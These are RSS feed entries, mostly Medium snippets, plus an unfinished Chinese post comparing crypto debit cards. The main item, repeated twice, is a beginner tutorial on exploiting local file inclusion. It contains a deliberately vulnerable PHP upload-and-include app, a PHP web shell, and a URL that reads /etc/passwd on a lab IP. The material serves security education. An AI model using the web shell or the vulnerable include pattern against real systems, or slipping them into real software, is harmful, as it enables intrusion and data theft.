[{"creator":"Parul Sahoo","title":"What OSS EU’22 had in store?","link":"https://medium.com/@parulsahoo5jan/what-oss-eu22-had-in-store-63407f3435ab?source=rss------devops-5","pubDate":"Thu, 15 Dec 2022 11:31:21 GMT","dc:creator":"Parul Sahoo","content":"<div class=\"medium-feed-item\"><p class=\"medium-feed-image\"><a href=\"https://medium.com/@parulsahoo5jan/what-oss-eu22-had-in-store-63407f3435ab?source=rss------devops-5\"><img src=\"https://cdn-images-1.medium.com/max/902/1*Wn-7F3ceSl8HjlWgpcMDUQ.png\" width=\"902\"></a></p><p class=\"medium-feed-snippet\">I had once read somewhere that &#x201C;Open Source takes you places&#x201D;. And I was able to witness this adage converting into reality for me, when I&#x2026;</p><p class=\"medium-feed-link\"><a href=\"https://medium.com/@parulsahoo5jan/what-oss-eu22-had-in-store-63407f3435ab?source=rss------devops-5\">Continue reading on Medium »</a></p></div>","contentSnippet":"I had once read somewhere that “Open Source takes you places”. And I was able to witness this adage converting into reality for me, when I…\nContinue reading on Medium »","guid":"https://medium.com/p/63407f3435ab","categories":["conference","travel","devops","open-source","technology"],"isoDate":"2022-12-15T11:31:21.000Z","from":"https://medium.com/feed/tag/devops","hashId":"df9fe20db780e5112ec5f41ac6f29fa7"},{"creator":"Yoram Kornatzky","title":"What to Monitor in a Website","link":"https://kornatzky.medium.com/what-to-monitor-in-a-website-89b9358ea6e2?source=rss------devops-5","pubDate":"Thu, 15 Dec 2022 11:37:41 GMT","dc:creator":"Yoram Kornatzky","content":"<div class=\"medium-feed-item\"><p class=\"medium-feed-image\"><a href=\"https://kornatzky.medium.com/what-to-monitor-in-a-website-89b9358ea6e2?source=rss------devops-5\"><img src=\"https://cdn-images-1.medium.com/max/1062/1*hSM3XP36dy-XCOlqqdtiXQ.jpeg\" width=\"1062\"></a></p><p class=\"medium-feed-snippet\">You put up a website and get offers to monitor your website. What should you monitor? Let&#x2019;s put in an order.</p><p class=\"medium-feed-link\"><a href=\"https://kornatzky.medium.com/what-to-monitor-in-a-website-89b9358ea6e2?source=rss------devops-5\">Continue reading on Medium »</a></p></div>","contentSnippet":"You put up a website and get offers to monitor your website. What should you monitor? Let’s put in an order.\nContinue reading on Medium »","guid":"https://medium.com/p/89b9358ea6e2","categories":["devops","website","monitoring","cloud-computing","infrastructure"],"isoDate":"2022-12-15T11:37:41.000Z","from":"https://medium.com/feed/tag/devops","hashId":"ec99ce7e3623a63c3e4b756d13458da5"},{"creator":"StackZero","title":"How To Exploit File Inclusion Vulnerabilities: A Beginner’s Introduction. — StackZero","link":"https://infosecwriteups.com/how-to-exploit-file-inclusion-vulnerabilities-a-beginners-introduction-stackzero-a55267b5fafb?source=rss----7b722bfd1b8d---4","pubDate":"Thu, 15 Dec 2022 11:37:41 GMT","content:encoded":"<h3>How To Exploit File Inclusion Vulnerabilities: A Beginner’s Introduction. — StackZero</h3><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*du4_D8tDoxXvJlp4.jpg\" /></figure><blockquote>This is a summary of the article in my blog: <a href=\"https://stackzero.net/file-inclusion-introduction/\">https://stackzero.net/file-inclusion-introduction/</a></blockquote><p>In this article, we will be exploring the ins and outs of file inclusion vulnerability exploitation. We will cover what file inclusion vulnerabilities are, how they work, and how hackers can exploit it. <br>I’m going to try to make this introduction to file inclusion vulnerability as beginner-friendly as possible. So you probably won’t need a deep prior knowledge of the treated arguments. You should be able to follow along and learn something it doesn’t matter what your starting point is.<br> By the end of this article, I guess, you will have a solid understanding of file inclusion vulnerabilities. <br>So let’s get started!</p><h3>Definition Of File Inclusion Vulnerability</h3><p>A file inclusion vulnerability is a security flaw that allows an attacker to access/execute arbitrary files on a target system. <br>We can often find this type of vulnerability in web applications that dynamically include files based on user input. <br>The lack of appropriate checks could allow the attacker to gain unauthorized access to sensitive data. <br>File inclusion vulnerabilities can be difficult to detect and protect against, making them a common target for hackers.</p><h3>How Does File Inclusion Work?</h3><p>Now that we have seen the definition, let’s go a bit deeper and see how it works.</p><p>File inclusion works by allowing an application to dynamically include and execute files based on user input. But just to stress more the concept, try to imagine this example:<br>We consider a hypothetical application that:</p><ul><li>allows users to upload their own profile pictures</li><li>generates a link to the uploaded picture and displays it on the user’s profile page.</li></ul><p>However, if the application does not properly validate the file type or the location of the file, an attacker could:</p><ul><li>exploit this by uploading a malicious file and tricking the application into executing it.</li><li>get unauthorized access to some sensitive data</li></ul><h3>What Types Of File Inclusion Vulnerability Exist?</h3><p>There are two main types of file inclusion vulnerabilities: local file inclusion (LFI) and remote file inclusion (RFI).</p><ol><li><strong>Local file inclusion</strong> (LFI) vulnerabilities occur when an attacker can manipulate an application to include and execute files from the local file system. We can find this particular vulnerability in web applications that don’t check for user input and load dynamically some files. <br>It can be extremely dangerous when the target application has also an <a href=\"https://stackzero.net/unrestricted-file-upload-vulnerability/\">Unrestricted File Upload</a> vulnerability as we have seen in the related article.<br>The combination of these two vulnerabilities can let an attacker do whatever he wants. In other cases, the vulnerability can be still dangerous but it can have some limits.</li><li><strong>Remote file inclusion</strong> (RFI) vulnerabilities occur when an attacker can manipulate an application to include and execute files from a remote location. We can find this vulnerability in applications that dynamically include files from external sources, based on user input. Such as a website that displays user-generated content. An attacker can exploit this type of vulnerability by tricking the application into including and executing a malicious file from a remote server under his control.</li></ol><p>In other words:</p><ul><li><strong>LFI</strong> allows the inclusion of files in the local file system</li><li>With <strong>RFI</strong> the file can be on a remote server.</li></ul><h3>Directory Path Traversal Vs File Inclusion</h3><p>The difference between directory path traversal and file inclusion is not so clear so, in this introduction, I want to go a bit deeper!</p><p>By looking at the web, I noticed that those two vulnerabilities cause a bit of confusion, so I’ll try to explain them at my best!</p><p>Path traversal and file inclusion are similar in that they both involve manipulating the file system of a target system. However, they differ in the specific ways that they are exploited and the types of vulnerabilities that they target.</p><ul><li><strong>Path traversal</strong>, also known as directory traversal, is a type of vulnerability that allows an attacker to access files and directories that are outside of the intended directory structure. The attacker in this case manipulates the file path of a request to access files or directories that should not be visible. For example, an attacker could exploit a path traversal vulnerability by accessing the root directory of a server and viewing sensitive files that are not normally accessible to them.</li><li><strong>File inclusion</strong>, on the other hand, involves manipulating an application to include and execute files from the file system.</li></ul><p>Overall, while both path traversal and file inclusion involve manipulating the file system of a target system, they target different types of vulnerabilities and their exploitation is pretty different. <br>Summing up, Directory Path Traversal vulnerabilities allow an attacker to access files and directories that are outside of the intended directory structure, while File Inclusion vulnerabilities allow an attacker to include and execute arbitrary files on a target system.<br>So the main difference is that File Inclusion, as the name says, includes a file and then executes it.</p><h3>Example Of LFI</h3><p>Even if it’s just an introduction to file inclusion vulnerability, I want to show you a practical example of LFI.<br>Obviously, I’ll try to keep the technical part as little as possible.</p><p>First of all, to exploit this vulnerability we want our malicious payload inside the target server. So in order to simulate a real case, I want to couple this vulnerability with the already seen “ <a href=\"https://stackzero.net/unrestricted-file-upload-vulnerability/\">Unrestricted File Upload</a> “</p><p>Here is an example of an application that has these vulnerabilities:</p><ul><li>Local File Inclusion</li><li>Unrestricted File Upload</li></ul><p>If you want to run it on your machine, you should have an HTTP server which supports PHP ( <a href=\"https://www.apachefriends.org/\">XAMPP</a> can be a valid alternative). In this tutorial, I assume you are working on your Kali Machine, so you just need to install PHP by typing this in your terminal and then use the <a href=\"https://www.php.net/manual/en/features.commandline.webserver.php\">built-in server</a>:</p><pre>sudo apt install php libapache2-mod-php</pre><p>Now you can create a file called “index.php” and write this code inside:</p><pre>&lt;?php<br>// include the file passed as GET parameter<br>if (isset($_GET[&#39;file&#39;])) {<br>    include($_GET[&#39;file&#39;]);<br>}<br><br>// upload the file<br>if (isset($_FILES[&#39;file&#39;])) {<br>    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;uploads/&#39; . $_FILES[&#39;file&#39;][&#39;name&#39;]);<br>}<br><br>?&gt;<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;<br>    &lt;title&gt;Document&lt;/title&gt;<br>    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot; integrity=&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin=&quot;anonymous&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div class=&quot;container&quot;&gt;<br>        &lt;div class=&quot;row&quot;&gt;<br><br>            &lt;div class=&quot;col-md-6&quot;&gt;<br>                &lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>                    &lt;div class=&quot;form-group&quot;&gt;<br>                        &lt;label for=&quot;file&quot;&gt;Upload file&lt;/label&gt;<br>                        &lt;input type=&quot;file&quot; class=&quot;form-control&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;<br>                    &lt;/div&gt;<br>                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;<br>                &lt;/form&gt;<br>            &lt;/div&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</pre><p>This is a PHP script that:</p><ul><li>Handles file uploads</li><li>Includes a file if a GET parameter named file is set</li><li>Checks if the file parameter is set in the $_GET superglobal array</li><li>If it is, the script will include the file specified by the parameter.</li><li>Next, the script checks if a file has been uploaded via a POST request by checking if the file element is set in the $_FILES superglobal array</li><li>If a file has been uploaded, the script will move the uploaded file to the uploads/ directory and give it the original name of the uploaded file.</li><li>The script then outputs an HTML document with a file upload form.</li></ul><p>The form uses the POST method and has the enctype attribute set to &quot;multipart/form-data&quot; to allow file uploads. On form submission, the server executes the file we sent.</p><p>It’s easy, but before proceeding let’s create a directory called “uploads” by typing on the terminal:</p><pre>mkdir uploads</pre><p>Now we can execute our simple PHP server with the command:</p><pre>php -S 0.0.0.0:8000 -t .</pre><p>Finally, this is the result in our browser by typing http://&lt;TARGET_IP&gt;:8000</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/803/1*TLB8mWESmHwyWAoVZ3ysfA.jpeg\" /></figure><p>Now you can look for a backdoor or maybe create it by yourself, I’m going to use the one at this address, and this is the code:</p><pre>&lt;?php<br><br>if(isset($_REQUEST[&#39;cmd&#39;])){<br>        echo &quot;&lt;pre&gt;&quot;;<br>        $cmd = ($_REQUEST[&#39;cmd&#39;]);<br>        system($cmd);<br>        echo &quot;&lt;/pre&gt;&quot;;<br>        die;<br>}<br><br>?&gt;&lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#39;cmd&#39;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; } ?&gt;</pre><p>So let’s upload it with the form, and after that, it’s inside the “uploads” folder, so we can execute cat or whatever we want by typing an URL like this:</p><p><a href=\"http://192.168.1.110:8000/?file=uploads/payload.php&amp;cmd=cat%20/etc/passwd\">http://192.168.1.110:8000/?file=uploads/payload.php&amp;cmd=cat%20/etc/passwd</a></p><p>In this case, it will prompt the content of /etc/passwd.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/786/1*KCs1_tbNJeBdWXGIFUD-sg.jpeg\" /></figure><p>It would be pretty easy to understand how to take advantage of that to take down the system totally.</p><h3>Conclusion</h3><p>In conclusion, file inclusion vulnerabilities are a serious threat to the security of web applications. These vulnerabilities allow attackers to include and execute arbitrary files on a target system, potentially gaining unauthorized access to sensitive data or compromising the system in other ways. As we have seen in the examples above, file inclusion vulnerabilities can be difficult to detect and protect against, making them a common target for hackers. Therefore, it is essential for organizations to take steps to secure their systems against file inclusion vulnerabilities and regularly monitor for potential attacks. By doing so, they can safeguard their systems and prevent costly and damaging breaches.</p><p>I hope you liked this introduction to file inclusion. If you find useful my work, please keep taking a look at my <a href=\"http://stackzero.net\">blog</a> (maybe add it to your favourites) and follow all my social profiles!</p><p><em>Follow me on medium to receive my new articles. And if you want to subscribe to Medium, consider to use my referral link, it’s not an additional cost for you but would be a big help for me.</em></p><p><a href=\"https://medium.com/@stackzero/membership\">Join Medium with my referral link - StackZero</a></p><h3>Other articles you may like:</h3><ul><li><a href=\"https://infosecwriteups.com/unrestricted-file-upload-a-common-bug-with-a-high-potential-revenue-on-hackerone-stackzero-dcf71e56e48b\">Unrestricted File Upload: A Common Bug With A High Potential Revenue On HackerOne! — StackZero</a></li><li><a href=\"https://medium.com/codex/wanna-bet-that-csrf-is-not-as-hard-as-you-think-905ec7e03609\">Wanna Bet That CSRF Is Not As Hard as you think?</a></li><li><a href=\"https://infosecwriteups.com/guess-your-enemies-passwords-with-python-brute-force-attack-99352e65ec8a\">Guess Your Enemies’ Passwords With Python (Brute Force Attack)</a></li><li><a href=\"https://infosecwriteups.com/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec\">Learn SQL injection in practice by hacking vulnerable application! — StackZero</a></li><li><a href=\"https://medium.com/codex/xss-in-practice-how-to-exploit-xss-in-web-applications-walktrought-into-google-xss-game-c939f30005ea\">XSS in practice: how to exploit XSS in web applications (Walktrought into Google XSS game) —…</a></li></ul><p><em>Originally published at </em><a href=\"https://stackzero.net/file-inclusion-introduction/\"><em>https://stackzero.net</em></a><em> on December 15, 2022.</em></p><h4>From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. <a href=\"https://weekly.infosecwriteups.com/\">Join our weekly newsletter</a> to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!</h4><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=a55267b5fafb\" width=\"1\" height=\"1\" alt=\"\"><hr><p><a href=\"https://infosecwriteups.com/how-to-exploit-file-inclusion-vulnerabilities-a-beginners-introduction-stackzero-a55267b5fafb\">How To Exploit File Inclusion Vulnerabilities: A Beginner’s Introduction. — StackZero</a> was originally published in <a href=\"https://infosecwriteups.com\">InfoSec Write-ups</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>","content:encodedSnippet":"How To Exploit File Inclusion Vulnerabilities: A Beginner’s Introduction. — StackZero\n\nThis is a summary of the article in my blog: https://stackzero.net/file-inclusion-introduction/\nIn this article, we will be exploring the ins and outs of file inclusion vulnerability exploitation. We will cover what file inclusion vulnerabilities are, how they work, and how hackers can exploit it. \nI’m going to try to make this introduction to file inclusion vulnerability as beginner-friendly as possible. So you probably won’t need a deep prior knowledge of the treated arguments. You should be able to follow along and learn something it doesn’t matter what your starting point is.\n By the end of this article, I guess, you will have a solid understanding of file inclusion vulnerabilities. \nSo let’s get started!\nDefinition Of File Inclusion Vulnerability\nA file inclusion vulnerability is a security flaw that allows an attacker to access/execute arbitrary files on a target system. \nWe can often find this type of vulnerability in web applications that dynamically include files based on user input. \nThe lack of appropriate checks could allow the attacker to gain unauthorized access to sensitive data. \nFile inclusion vulnerabilities can be difficult to detect and protect against, making them a common target for hackers.\nHow Does File Inclusion Work?\nNow that we have seen the definition, let’s go a bit deeper and see how it works.\nFile inclusion works by allowing an application to dynamically include and execute files based on user input. But just to stress more the concept, try to imagine this example:\nWe consider a hypothetical application that:\n\nallows users to upload their own profile pictures\ngenerates a link to the uploaded picture and displays it on the user’s profile page.\n\nHowever, if the application does not properly validate the file type or the location of the file, an attacker could:\n\nexploit this by uploading a malicious file and tricking the application into executing it.\nget unauthorized access to some sensitive data\n\nWhat Types Of File Inclusion Vulnerability Exist?\nThere are two main types of file inclusion vulnerabilities: local file inclusion (LFI) and remote file inclusion (RFI).\n\nLocal file inclusion (LFI) vulnerabilities occur when an attacker can manipulate an application to include and execute files from the local file system. We can find this particular vulnerability in web applications that don’t check for user input and load dynamically some files. \nIt can be extremely dangerous when the target application has also an Unrestricted File Upload vulnerability as we have seen in the related article.\nThe combination of these two vulnerabilities can let an attacker do whatever he wants. In other cases, the vulnerability can be still dangerous but it can have some limits.\nRemote file inclusion (RFI) vulnerabilities occur when an attacker can manipulate an application to include and execute files from a remote location. We can find this vulnerability in applications that dynamically include files from external sources, based on user input. Such as a website that displays user-generated content. An attacker can exploit this type of vulnerability by tricking the application into including and executing a malicious file from a remote server under his control.\n\nIn other words:\n\nLFI allows the inclusion of files in the local file system\nWith RFI the file can be on a remote server.\n\nDirectory Path Traversal Vs File Inclusion\nThe difference between directory path traversal and file inclusion is not so clear so, in this introduction, I want to go a bit deeper!\nBy looking at the web, I noticed that those two vulnerabilities cause a bit of confusion, so I’ll try to explain them at my best!\nPath traversal and file inclusion are similar in that they both involve manipulating the file system of a target system. However, they differ in the specific ways that they are exploited and the types of vulnerabilities that they target.\n\nPath traversal, also known as directory traversal, is a type of vulnerability that allows an attacker to access files and directories that are outside of the intended directory structure. The attacker in this case manipulates the file path of a request to access files or directories that should not be visible. For example, an attacker could exploit a path traversal vulnerability by accessing the root directory of a server and viewing sensitive files that are not normally accessible to them.\nFile inclusion, on the other hand, involves manipulating an application to include and execute files from the file system.\n\nOverall, while both path traversal and file inclusion involve manipulating the file system of a target system, they target different types of vulnerabilities and their exploitation is pretty different. \nSumming up, Directory Path Traversal vulnerabilities allow an attacker to access files and directories that are outside of the intended directory structure, while File Inclusion vulnerabilities allow an attacker to include and execute arbitrary files on a target system.\nSo the main difference is that File Inclusion, as the name says, includes a file and then executes it.\nExample Of LFI\nEven if it’s just an introduction to file inclusion vulnerability, I want to show you a practical example of LFI.\nObviously, I’ll try to keep the technical part as little as possible.\nFirst of all, to exploit this vulnerability we want our malicious payload inside the target server. So in order to simulate a real case, I want to couple this vulnerability with the already seen “ Unrestricted File Upload “\nHere is an example of an application that has these vulnerabilities:\n\nLocal File Inclusion\nUnrestricted File Upload\n\nIf you want to run it on your machine, you should have an HTTP server which supports PHP ( XAMPP can be a valid alternative). In this tutorial, I assume you are working on your Kali Machine, so you just need to install PHP by typing this in your terminal and then use the built-in server:\nsudo apt install php libapache2-mod-php\nNow you can create a file called “index.php” and write this code inside:\n<?php\n// include the file passed as GET parameter\nif (isset($_GET['file'])) {\n    include($_GET['file']);\n}\n// upload the file\nif (isset($_FILES['file'])) {\n    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\">\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"row\">\n            <div class=\"col-md-6\">\n                <form action=\"\" method=\"POST\" enctype=\"multipart/form-data\">\n                    <div class=\"form-group\">\n                        <label for=\"file\">Upload file</label>\n                        <input type=\"file\" class=\"form-control\" name=\"file\" id=\"file\">\n                    </div>\n                    <button type=\"submit\" class=\"btn btn-primary\">Submit</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</body>\n</html>\nThis is a PHP script that:\n\nHandles file uploads\nIncludes a file if a GET parameter named file is set\nChecks if the file parameter is set in the $_GET superglobal array\nIf it is, the script will include the file specified by the parameter.\nNext, the script checks if a file has been uploaded via a POST request by checking if the file element is set in the $_FILES superglobal array\nIf a file has been uploaded, the script will move the uploaded file to the uploads/ directory and give it the original name of the uploaded file.\nThe script then outputs an HTML document with a file upload form.\n\nThe form uses the POST method and has the enctype attribute set to \"multipart/form-data\" to allow file uploads. On form submission, the server executes the file we sent.\nIt’s easy, but before proceeding let’s create a directory called “uploads” by typing on the terminal:\nmkdir uploads\nNow we can execute our simple PHP server with the command:\nphp -S 0.0.0.0:8000 -t .\nFinally, this is the result in our browser by typing http://<TARGET_IP>:8000\n\nNow you can look for a backdoor or maybe create it by yourself, I’m going to use the one at this address, and this is the code:\n<?php\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        system($cmd);\n        echo \"</pre>\";\n        die;\n}\n?><?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; } ?>\nSo let’s upload it with the form, and after that, it’s inside the “uploads” folder, so we can execute cat or whatever we want by typing an URL like this:\nhttp://192.168.1.110:8000/?file=uploads/payload.php&cmd=cat%20/etc/passwd\nIn this case, it will prompt the content of /etc/passwd.\n\nIt would be pretty easy to understand how to take advantage of that to take down the system totally.\nConclusion\nIn conclusion, file inclusion vulnerabilities are a serious threat to the security of web applications. These vulnerabilities allow attackers to include and execute arbitrary files on a target system, potentially gaining unauthorized access to sensitive data or compromising the system in other ways. As we have seen in the examples above, file inclusion vulnerabilities can be difficult to detect and protect against, making them a common target for hackers. Therefore, it is essential for organizations to take steps to secure their systems against file inclusion vulnerabilities and regularly monitor for potential attacks. By doing so, they can safeguard their systems and prevent costly and damaging breaches.\nI hope you liked this introduction to file inclusion. If you find useful my work, please keep taking a look at my blog (maybe add it to your favourites) and follow all my social profiles!\nFollow me on medium to receive my new articles. And if you want to subscribe to Medium, consider to use my referral link, it’s not an additional cost for you but would be a big help for me.\nJoin Medium with my referral link - StackZero\nOther articles you may like:\n\nUnrestricted File Upload: A Common Bug With A High Potential Revenue On HackerOne! — StackZero\nWanna Bet That CSRF Is Not As Hard as you think?\nGuess Your Enemies’ Passwords With Python (Brute Force Attack)\nLearn SQL injection in practice by hacking vulnerable application! — StackZero\nXSS in practice: how to exploit XSS in web applications (Walktrought into Google XSS game) —…\n\nOriginally published at https://stackzero.net on December 15, 2022.\nFrom Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. Join our weekly newsletter to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!\n\nHow To Exploit File Inclusion Vulnerabilities: A Beginner’s Introduction. — StackZero was originally published in InfoSec Write-ups on Medium, where people are continuing the conversation by highlighting and responding to this story.","dc:creator":"StackZero","guid":"https://medium.com/p/a55267b5fafb","categories":["pentesting","penetration-testing","cybersecurity","bug-bounty","hacking"],"isoDate":"2022-12-15T11:37:41.000Z","from":"https://medium.com/feed/bugbountywriteup","hashId":"9e69e0dc27e915be569a6b009b15bb27"},{"creator":"Vikrant Mane","title":"How much salary does a Kubernetes engineer get?","link":"https://medium.com/kube-careers/how-much-salary-does-a-kubernetes-engineer-get-79c082d4f229?source=rss------devops-5","pubDate":"Thu, 15 Dec 2022 11:39:09 GMT","dc:creator":"Vikrant Mane","content":"<div class=\"medium-feed-item\"><p class=\"medium-feed-image\"><a href=\"https://medium.com/kube-careers/how-much-salary-does-a-kubernetes-engineer-get-79c082d4f229?source=rss------devops-5\"><img src=\"https://cdn-images-1.medium.com/max/1280/1*S4mFbxZKE-u-txx9Qj5RCw.png\" width=\"1280\"></a></p><p class=\"medium-feed-snippet\">$250,000 is the maximum salary offered for a Kubernetes job in our dataset!</p><p class=\"medium-feed-link\"><a href=\"https://medium.com/kube-careers/how-much-salary-does-a-kubernetes-engineer-get-79c082d4f229?source=rss------devops-5\">Continue reading on Kube Careers »</a></p></div>","contentSnippet":"$250,000 is the maximum salary offered for a Kubernetes job in our dataset!\nContinue reading on Kube Careers »","guid":"https://medium.com/p/79c082d4f229","categories":["devops","kubernetes","careers","salary","remote-work"],"isoDate":"2022-12-15T11:39:09.000Z","from":"https://medium.com/feed/tag/devops","hashId":"e76cd28d101688585a3a50ef9dbb48ed"},{"title":"一文了解2022年全球最受欢迎的8大加密货币卡","link":"https://mirror.xyz/0xA1991C47cb9Eb325164952F931d8616672f43C29/_I6NJiGA4uUmhaHVxWDZyf_-zIgEfpJFYepZaMHeM1Y","pubDate":"Thu, 15 Dec 2022 11:40:55 GMT","content:encoded":"<p>随着加密货币的持续流行，业内公司也在努力寻求更多方法，降低人们进入加密货币世界的门槛。 方法之一是推出加密货币借记卡。</p>\n<p> </p>\n<p>在这篇文章中，我们将介绍一些在选择加密货币卡时需要考虑的问题，并向大家推荐八种优质加密货币卡片。</p>\n<p> </p>\n<p><strong>什么是加密货币借记卡？</strong></p>\n<p> </p>\n<p>加密货币卡的工作原理与普通借记卡相同，区别是它们与<a href=\"https://resources.hi.com/the-best-crypto-wallet/\">j</a>加密货币钱包相连， 而不是与普通银行账户相连。 通过转换你钱包里的资金，加密货币卡允许你像使用传统信用卡一样在各类商家中进行消费，即使这些商家不接受加密货币。</p>\n<p> </p>\n<p><strong>如何选择更适合的加密货币借记卡？</strong></p>\n<p> </p>\n<p>因为需要考虑的因素众多，所以选择加密货币卡可能比较难。 需要考虑的主要因素与安全、费用、奖励以及所支持的货币种类有关。 对于大家感兴趣的卡片，一定要确保了解其所有细节，并将其与市场上的其他卡片进行比较，以选出最适合自己的卡片。</p>\n<p> </p>\n<p><strong>安全性：</strong> 大多数卡都提供安全措施，如双因素认证，但有些则没有。 一定要查看你选择的卡是否有一些安全保障，以确保资金安全。</p>\n<p> </p>\n<p><strong>费用：</strong> 大多数加密货币卡都有费用， 可能包括月费、国外交易费和自动取款机手续费。 尽可能找一张收费较少的卡。</p>\n<p> </p>\n<p><strong>奖励：</strong> 很多加密货币卡提供加密货币返现作为奖励，使得用户能够受益更多。</p>\n<p> </p>\n<p><strong>质押要求：</strong> 对于有多个会员等级的加密货币卡，为了解锁最高奖励，可能有较高的质押要求。 在研究所提供的奖励和选择等级时，也需要考虑到这一点。</p>\n<p> </p>\n<p><strong>支持的货币种类：</strong> 一些加密货币卡只支持少数特定货币。 你应该确保你选择的卡支持你喜欢的货币。</p>\n<p> </p>\n<p><strong>支持的国家区域：</strong> 有些卡只支援特定地区，如欧洲或美国。 请务必确定你考虑中的卡是否在你的地区可用。</p>\n<p> </p>\n<p>笔者为大家筛选了当前市场上较为热门的几个加密货币卡，并对他们的优缺点进行了点评，希望能够很高的帮助到大家。</p>\n<p><strong>Crypto.com</strong></p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/-vsqfspaxvt5T4EueLu6O.png?height=763&width=641\" alt=\"\"></p>\n<p> </p>\n<p>Crypto.com是市场上领先的加密货币应用程序之一， 提供各种各样的奖励，如每月订阅服务的报销，CRO形式的高额返现，享受机场贵宾室，等等。 听起来很吸引人，但需要注意的是，以上福利和奖励基于不同层级而变化。 选择Crypto.com卡时，由于其质押的数额要求较高，有些层级很难达到。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/hogyuHFdAhMlQRcb844o7.png?height=500&width=644\" alt=\"\"></p>\n<p> </p>\n<p> </p>\n<p><strong>HyperCard</strong></p>\n<p> </p>\n<p>首先看一下官方提供的选购指南：</p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/jOvopNhf22r8t9pgK6ftH.jpg?height=640&width=691\" alt=\"\"></p>\n<p> </p>\n<p>HyperCard种类比较多，有虚拟卡也有实体卡，还有新近推出的至尊返利卡，我为大家一一列举一下：</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/M8c6Bg6EmEZJ_WZXF87td.png?height=721&width=569\" alt=\"\"></p>\n<p> </p>\n<p><strong>HyperCard至尊返利卡</strong></p>\n<p> </p>\n<p>HyperCard的至尊返利卡模式与CRO卡类似，但是返利额度比CRO卡要高。</p>\n<p> </p>\n<p>这是类消费挖矿的形式，不同的锁仓额度所对应的返利额度也不同，锁仓HW5，基础消费返利比例为4%-12%，返利额度可以获得10倍增幅（8倍归属自己，2倍归属邀请人），起步锁仓额度为1000等值USDT代币，在用户申请了至尊返利卡后，并使用HyperCard进行消费的情况下，消费了100USDT，那可以获得32USDT等值HW5的返利，这32USDT的返利将在每个月15号分12笔返到用户的账户中，这是基于成功消费的前提下，如果发生了退款行为，HyperPay钱包会扣除退款部分所对应的返利，具体返利比例和需求等级如下：</p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/_6x9p6LWN53LE9wWdHCHp.jpg?height=249&width=692\" alt=\"\"></p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/COk6lyDGx6kmiZ5S4YSfC.png?height=738&width=644\" alt=\"\"></p>\n<p><strong>Coinbase</strong></p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/-sFXOIGa9rCmJsNSjk4mj.png?height=738&width=647\" alt=\"\"></p>\n<p> </p>\n<p>由受欢迎的交易所Coinbase发行的<a href=\"https://resources.hi.com/coinbase-card-review/\">j</a>加密货币卡，提供每次购物时高达4%的奖励。 该借记卡与Coinbase加密货币账户相连，允许用户自动清算加密货币资产，以美元支付物品。 获得的奖励将基于你选择的币种–如果你想获得比特币的返现，比率将是1%。 如果你想获得Stella Lumens返现，则可以获得4%。 用户可以随时在这两种奖励之间切换。</p>\n<p> </p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/tRbC0gZyt_0wev9dtvmv5.png?height=489&width=645\" alt=\"\"></p>\n<p> </p>\n<p> </p>\n<p><strong>Binance</strong></p>\n<p><img src=\"https://images.mirror-media.xyz/publication-images/HvXlazGgDpTzYVhqtT3Hl.png?height=477&width=645\" alt=\"\"></p>\n<p> 